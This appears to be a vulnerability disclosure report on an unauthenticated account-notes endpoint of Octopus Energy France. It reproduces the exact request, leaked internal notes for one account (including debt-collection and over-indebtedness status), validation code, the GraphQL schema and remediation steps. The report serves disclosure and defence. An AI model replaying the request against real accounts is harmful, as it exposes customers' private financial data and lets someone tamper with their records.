# BOLA — `/api/account/create-account-note` — Read & Write Account Notes for Any Account

**Severity:** High  
**CWE:** CWE-862 — Missing Authorization  
**Scope:** Octopus Energy France (octopusenergy.fr)  
**Endpoints:** `POST /api/account/create-account-note`  
**Date:** 2026-07-17  

---

## Summary

The endpoint `/api/account/create-account-note` allows adding internal notes to any customer account **without requiring any authentication or authorization**. While the `note` field is strictly validated (only certain predefined strings are accepted), the `accountNumber` parameter is fully controllable by the attacker. The response contains **all existing internal notes** for the targeted account, exposing sensitive operational data including internal campaign names, debt collection activities, partner references, other account numbers, and support team actions.

---

## Vulnerability Details

### Request

```
POST /api/account/create-account-note
Host: octopusenergy.fr
Content-Type: application/json
```

```json
{
    "accountNumber": "A-2E75CB9B",
    "isPinned": false,
    "note": "Paiement échoué - 0 / 2 (FAILED)"
}
```

### Response

```json
{
    "createAccountNote": {
        "account": {
            "notes": [
                { "body": "Paiement échoué - 0 / 2 (IN_PROGRESS)" },
                { "body": "Updated Testeur - Global Billing XP expiry_date on account #A-2E75CB9B." },
                { "body": "En recouvrement chez GCE, un prestataire de recouvrement externe" },
                { "body": "En recouvrement chez GCE, un prestataire de recouvrement externe" },
                { "body": "Updated Eco-Session expiry_date on account #A-2E75CB9B." },
                { "body": "Vente du 2022-10-13 \r\n 2024-12-24\r\n2024-08-29\r\n2024-12-24  changement du sous canal Americano > OCTOPUS ENERGY DIRECT" },
                { "body": "Updated Label Vert Volt - Engagé on A-2E75CB9B." },
                { "body": "Updated Eco-Sessions 24-25 on A-2E75CB9B." },
                { "body": "Updated Eco Sessions expiry_date on account #A-2E75CB9B." },
                { "body": "Updated Eco-Session on A-2E75CB9B." },
                { "body": "Updated Revue mensualité OPS - TRV expiry_date on account #A-2E75CB9B." },
                { "body": "Updated Commission sur-endettement expiry_date on account #A-2E75CB9B." },
                { "body": "Updated Fake parrainage expiry_date on account #A-2E75CB9B." },
                { "body": "Updated Ancien ambassadeur Plüm expiry_date on account #A-2E75CB9B." },
                { "body": "les chaussettes de l'archiduchesse" },
                { "body": "test 2" },
                { "body": "test" }
            ]
        }
    }
}
```

### How it works

1. **No authentication required** — the endpoint does not check for any session cookie, API token, or origin header.
2. **accountNumber is fully controllable** — by changing this parameter, an attacker can access notes for any account.
3. **The response leaks all existing notes** — every internal note associated with the account is returned in the `notes` array.
4. **Write access is also unauthenticated** — while the `note` field is constrained by a strict regex pattern (only payment failure log strings are accepted), the attacker can still write a note to any account, polluting legitimate records.
5. **The endpoint is a proxy to the internal Kraken GraphQL mutation** `createAccountNote(CreateAccountNoteInput!)`.

---

## Sensitive Data Exposed

The leaked notes reveal:

### Internal Business Operations

| Leak | Details |
|------|---------|
| **Debt Collection Partner** | `GCE` — an external debt recovery agency |
| **Over-indebtedness** | `Commission sur-endettement` — commission on over-indebted customers |
| **Sales Channel** | `Americano > OCTOPUS ENERGY DIRECT` — internal sales channel changes |
| **Past Partner** | `Plüm` (likely Plüm Energie) — former ambassador program |
| **Campaign Name — Suspicious** | `Fake parrainage` — translating to "Fake referral/sponsorship" |
| **Campaign Names** | `Label Vert Volt`, `Eco-Sessions 24-25`, `Eco-Session`, `Revue mensualité OPS - TRV`, `Global Billing XP`, `Testeur - Global Billing XP` |
| **Historic Sale Date** | 2022-10-13 |
| **Staff Test Notes** | Multiple test entries (`test`, `test 2`, `les chaussettes de l'archiduchesse`)

### Other Accounts Referenced

The notes contain references to account **`A-2E75CB9B`** — confirming that this account number is used as an identifier across internal systems.

---

## Technical Details (from source code)

The endpoint is defined in the Astro API route configuration:

```typescript
// apps/consumer/src/routes/api.ts
createAccountNote: apiAccountRoutePath.create("/create-account-note"),
```

The request body is validated client-side with:

```javascript
let n = [/^Paiement échoué - [012] \/ 2 \((?:FAILED|IN_PROGRESS)\)$/];
t.z.object({
    accountNumber: t.z.string(),
    isPinned: t.z.boolean(),
    note: t.z.string().refine((e) => n.some((t) => t.test(e))),
});
```

### Accepted note values (strict — only payment failure patterns):

```
Paiement échoué - 0 / 2 (FAILED)
Paiement échoué - 1 / 2 (FAILED)
Paiement échoué - 2 / 2 (FAILED)
Paiement échoué - 0 / 2 (IN_PROGRESS)
Paiement échoué - 1 / 2 (IN_PROGRESS)
Paiement échoué - 2 / 2 (IN_PROGRESS)
```

The `isPinned` field must be a native boolean (`false` or `true`).

### GraphQL Schema (backend)

```graphql
mutation createAccountNote(input: CreateAccountNoteInput!) {
    input {
        accountNumber: String!
        note: String!
        isPinned: Boolean!
        unpinAt: DateTime
    }
    output {
        account: AccountType {
            notes: [AccountNoteType]     # ← Returns ALL notes
        }
        possibleErrors: [PossibleErrorType]
    }
}
```

---

## Impact

| Risk | Description |
|------|-------------|
| **Information Disclosure** | Attacker can enumerate accounts and extract internal notes containing PII, business processes, partner names, campaign details, and debt status |
| **Unauthorized Write** | Attacker can inject payment failure log entries into any account's notes |
| **Business Intelligence** | Internal campaign names (`Fake parrainage`, `Label Vert Volt`, `Eco-Sessions`), sales channels, and partner relationships are leaked |
| **Debt/Financial Status** | Notes reveal over-indebtedness (`sur-endettement`) and debt collection (`recouvrement`) status |

---

## Affected Accounts

Account **`A-2E75CB9B`** was tested and returned 17 internal notes with sensitive data. The vulnerability affects all accounts in the system.

---

## Remediation

1. **Implement authentication** — Require a valid session or API token before allowing access to `POST /api/account/create-account-note`
2. **Authorization check** — Verify the authenticated user has permission to read/write notes on the targeted account
3. **Scoped responses** — When creating a note, the response should only confirm success, not return all existing notes
4. **Audit logging** — Log all note creation attempts for forensic purposes

---

## Reports

This vulnerability was found alongside several other BOLA/IDOR endpoints on the Octopus Energy France platform, all following the same pattern: unauthenticated POST endpoints proxying to Kraken GraphQL mutations.
